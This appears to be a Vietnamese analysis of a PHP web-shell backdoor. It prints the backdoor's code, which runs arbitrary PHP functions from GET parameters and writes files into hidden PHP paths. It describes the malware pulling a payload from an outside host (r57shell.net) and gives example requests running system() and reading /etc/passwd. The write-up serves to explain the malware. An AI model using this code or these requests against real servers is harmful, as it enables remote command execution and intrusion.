-------------------------------------------------------------------------

```php
if (isset($_GET["f"]) && isset($_GET["c"])) {
    print_r($_GET["f"]($_GET["c"]));
}
```

- Ví dụ: `http://example.com/malcious.php?f=eval&c=system('ls')`

- Cho phép thực thi lệnh từ xa thông qua tham số f (hàm PHP) và c (tham số của hàm).

```php
if (isset($_GET["m"])) {
    $file_name_path = $_GET["m"] . "gagal.php";
    @file_put_contents($file_name_path, $response);
}
```

### Kịch bản tấn công

- Hacker sẽ upload file chứ đoạn mã php đã bị mã hóa lên server thông qua các phương thức như upload file,... hoặc chèn mã độc vào trong các file
- Khi đoạn mã đã được upload lên, hacker kích hoạt bằng cách gửi yêu cầu HTTP GET tới file chứa mã độc.
  - URL: `http://example.com/malicious.php`
  - Khi truy cập thì file malcious.php sẽ lấy nội dung mã độc từ `http://r57shell.net/jquery.php?v=1.2&request=enable` => ghi nội dung tải về vào hệ thống.
- Tiếp theo là bước ghi mã độc vào hệ thống.
  - Tạo file mới: Ghi nội dung tải về (payload) vào các file PHP mới trong hệ thống. 

  ```php
    $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php";
    @file_put_contents($file_name, $response);
  ```

  - Hoặc tạo backdoor với tham GET `m` để tạo file ở vị trí cụ thể: `http://example.com/malicious.php?m=/var/www/html/uploads/` => file sẽ được tạo với đường dẫn như sau: `/var/www/html/uploads/gagal.php`
- Sau đó hacker sẽ thực thi lệnh từ xa với các tham số f,c,m
  - Ví dụ: `http://example.com/malicious.php?f=system&c=cat /etc/passwd`
